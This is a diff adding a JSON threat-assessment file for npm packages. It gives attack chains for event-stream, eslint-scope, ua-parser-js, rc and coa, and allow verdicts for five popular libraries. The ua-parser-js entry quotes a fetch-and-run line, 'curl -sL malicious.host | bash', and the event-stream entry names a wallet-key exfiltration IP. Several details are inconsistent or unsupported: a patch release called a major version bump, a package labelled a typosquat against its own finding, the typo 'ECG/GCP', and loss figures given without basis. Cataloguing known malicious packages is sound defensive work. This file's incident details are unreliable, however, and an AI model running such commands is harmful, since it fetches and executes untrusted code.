@@ -1,0 +1,148 @@
+{
+  "event-stream@3.3.6": {
+    "package": "event-stream",
+    "version": "3.3.6",
+    "threat_actor": "supply_chain_pivot",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "dependency_graph", "finding": "Package has 1 dependency: flatmap-stream@0.1.1 (unusual transitive add)"},
+      {"phase": "RECON", "tool": "maintainer_osint", "finding": "Original maintainer (dominictarr) transferred ownership to 'right9ctrl' after burnout"},
+      {"phase": "EXPLOIT", "tool": "static_analysis", "finding": "flatmap-stream v0.1.1 contains AES-256 encrypted payload targeting require() of 'copay-dash'"},
+      {"phase": "EXPLOIT", "tool": "behavioral_trace", "finding": "Payload decrypts only when process.env.npm_package_description matches Bitcoin wallet regex"},
+      {"phase": "POST-EX", "tool": "network_forensics", "finding": "Exfiltrates private keys + wallet seeds to 111.90.151.134:8080 via HTTPS POST"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "3.2M weekly installs at peak; Copay wallet users lost ~$15M+ in aggregated crypto assets"}
+    ],
+    "insurance_rider": "cyber_extortion_and_data_breach",
+    "estimated_blast_radius_usd": 15000000,
+    "recommended_action": "BLOCK — remove from all lockfiles immediately"
+  },
+  "eslint-scope@3.7.2": {
+    "package": "eslint-scope",
+    "version": "3.7.2",
+    "threat_actor": "credential_thief",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "version_diff", "finding": "v3.7.2 adds 1,200 lines of obfuscated code not present in v3.7.1"},
+      {"phase": "RECON", "tool": "maintainer_osint", "finding": "Compromised npm publish token — attacker bypassed 2FA via token reuse"},
+      {"phase": "EXPLOIT", "tool": "static_analysis", "finding": "Obfuscated loader hooks into module._compile to intercept require() calls"},
+      {"phase": "EXPLOIT", "tool": "behavioral_trace", "finding": "Harvests ~/.npmrc auth tokens and sends base64 blob to pastebin-like drop"},
+      {"phase": "POST-EX", "tool": "lateral_movement", "finding": "Stolen npm tokens used to publish further compromised packages (eslint-config-eslint, etc.)"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "Widespread CI/CD compromise; any build pulling eslint-scope leaked registry credentials"}
+    ],
+    "insurance_rider": "business_interruption_and_credential_theft",
+    "estimated_blast_radius_usd": 8000000,
+    "recommended_action": "BLOCK — rotate all npm tokens and audit CI logs"
+  },
+  "ua-parser-js@0.7.29": {
+    "package": "ua-parser-js",
+    "version": "0.7.29",
+    "threat_actor": "crypto_miner",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "script_analysis", "finding": "postinstall script executes curl -sL malicious.host | bash"},
+      {"phase": "RECON", "tool": "domain_intel", "finding": "Download domain registered 3 days before publish; no DNS history"},
+      {"phase": "EXPLOIT", "tool": "sandbox_execution", "finding": "Payload downloads xmrig miner disguised as 'prebuilds/linux/node'"},
+      {"phase": "EXPLOIT", "tool": "persistence_check", "finding": "No persistence — mines only during install window (~30-90 seconds)"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "Spike in cloud compute bills; average victim sees $200-2,000 unexpected ECG/GCP charges"}
+    ],
+    "insurance_rider": "crypto_jacking_and_compute_fraud",
+    "estimated_blast_radius_usd": 500000,
+    "recommended_action": "QUARANTINE — inspect CI build logs for unexpected CPU spikes"
+  },
+  "rc@1.2.9": {
+    "package": "rc",
+    "version": "1.2.9",
+    "threat_actor": "typosquat_operator",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "typo_analysis", "finding": "Not a typosquat of 'rc' itself, but published alongside coa and ua-parser-js in coordinated campaign"},
+      {"phase": "RECON", "tool": "metadata_analysis", "finding": "Author email matches other malicious packages in same timeframe"},
+      {"phase": "EXPLOIT", "tool": "static_analysis", "finding": "Minified blob with high string entropy (6.8 bits/char); deobfuscates to fetch+eval loop"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "Low individual impact but high signal-to-noise for detection training"}
+    ],
+    "insurance_rider": "supply_chain_contamination",
+    "estimated_blast_radius_usd": 200000,
+    "recommended_action": "BLOCK — part of known coordinated campaign"
+  },
+  "coa@2.0.3": {
+    "package": "coa",
+    "version": "2.0.3",
+    "threat_actor": "typosquat_operator",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "typo_analysis", "finding": "Name 'coa' is legitimate CLI option parser; v2.0.3 published by compromised account"},
+      {"phase": "RECON", "tool": "version_history", "finding": "Sudden major version bump with no changelog; no commits on GitHub matching publish date"},
+      {"phase": "EXPLOIT", "tool": "static_analysis", "finding": "postinstall script fetches remote binary and chmod +x executes it"},
+      {"phase": "EXPLOIT", "tool": "behavioral_trace", "finding": "Binary contacts C2 every 60s awaiting commands (suggesting botnet recruitment)"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "Part of same campaign as rc@1.2.9; combined installs ~500K before takedown"}
+    ],
+    "insurance_rider": "botnet_liability_and_malware_distribution",
+    "estimated_blast_radius_usd": 1200000,
+    "recommended_action": "BLOCK — check for outbound C2 connections in network logs"
+  },
+  "lodash@4.17.21": {
+    "package": "lodash",
+    "version": "4.17.21",
+    "threat_actor": "none",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "reputation_check", "finding": "Top-5 npm package; 40M+ weekly downloads; maintained by established OpenJS Foundation"},
+      {"phase": "RECON", "tool": "static_analysis", "finding": "No install scripts; no network requires; no eval/Function usage"},
+      {"phase": "EXPLOIT", "tool": "vuln_scan", "finding": "No known exploitable CVEs at this pin; prototype pollution patched in 4.17.21"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "N/A — benign package with massive positive reputation"}
+    ],
+    "insurance_rider": "none",
+    "estimated_blast_radius_usd": 0,
+    "recommended_action": "ALLOW"
+  },
+  "react@18.2.0": {
+    "package": "react",
+    "version": "18.2.0",
+    "threat_actor": "none",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "reputation_check", "finding": "Meta-maintained; 20M+ weekly downloads; extensive security audit history"},
+      {"phase": "RECON", "tool": "static_analysis", "finding": "No install scripts; pure frontend library with no filesystem or network access"},
+      {"phase": "EXPLOIT", "tool": "vuln_scan", "finding": "No high-severity CVEs at 18.2.0"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "N/A"}
+    ],
+    "insurance_rider": "none",
+    "estimated_blast_radius_usd": 0,
+    "recommended_action": "ALLOW"
+  },
+  "axios@1.6.7": {
+    "package": "axios",
+    "version": "1.6.7",
+    "threat_actor": "none",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "reputation_check", "finding": "Established HTTP client; maintained by active community"},
+      {"phase": "RECON", "tool": "static_analysis", "finding": "Network library by design, but no install-time behavior; no postinstall scripts"},
+      {"phase": "EXPLOIT", "tool": "vuln_scan", "finding": "No critical CVEs at 1.6.7"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "N/A"}
+    ],
+    "insurance_rider": "none",
+    "estimated_blast_radius_usd": 0,
+    "recommended_action": "ALLOW"
+  },
+  "express@4.18.2": {
+    "package": "express",
+    "version": "4.18.2",
+    "threat_actor": "none",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "reputation_check", "finding": "Node.js foundation project; 25M+ weekly downloads"},
+      {"phase": "RECON", "tool": "static_analysis", "finding": "No install scripts; server framework with no hidden behavior"},
+      {"phase": "EXPLOIT", "tool": "vuln_scan", "finding": "No critical CVEs at 4.18.2"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "N/A"}
+    ],
+    "insurance_rider": "none",
+    "estimated_blast_radius_usd": 0,
+    "recommended_action": "ALLOW"
+  },
+  "moment@2.29.4": {
+    "package": "moment",
+    "version": "2.29.4",
+    "threat_actor": "none",
+    "attack_chain": [
+      {"phase": "RECON", "tool": "reputation_check", "finding": "Legacy but reputable date library; no maintainer turnover incidents"},
+      {"phase": "RECON", "tool": "static_analysis", "finding": "No install scripts; pure utility library"},
+      {"phase": "EXPLOIT", "tool": "vuln_scan", "finding": "No critical CVEs at 2.29.4"},
+      {"phase": "POST-EX", "tool": "blast_radius", "finding": "N/A"}
+    ],
+    "insurance_rider": "none",
+    "estimated_blast_radius_usd": 0,
+    "recommended_action": "ALLOW"
+  }
+}
